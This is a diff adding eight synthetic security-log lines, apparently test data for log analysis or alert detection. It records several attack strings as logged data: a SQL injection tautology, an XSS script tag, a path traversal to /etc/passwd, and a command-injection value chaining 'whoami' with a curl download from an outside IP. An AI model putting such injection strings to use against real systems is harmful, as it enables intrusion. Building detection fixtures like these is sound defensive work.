@@ -1,0 +1,8 @@
+2026-08-15 09:00:00 WARN SQL query: SELECT * FROM users WHERE username='admin' OR '1'='1'
+2026-08-15 09:00:19 WARN privilege escalation detected: sudo attempted by service account
+2026-08-15 09:01:35 WARN brute force attack against login service from 203.0.113.9
+2026-08-15 09:02:14 WARN XSS payload: <script>alert('x')</script>
+2026-08-15 09:03:03 WARN Path traversal: ../../etc/passwd
+2026-08-15 09:04:10 WARN command=whoami && curl http://198.51.100.23/payload
+2026-08-15 09:05:42 WARN suspicious ip 198.51.100.23 connected to internal API
+2026-08-15 09:06:01 WARN 401 unauthorized access to /admin
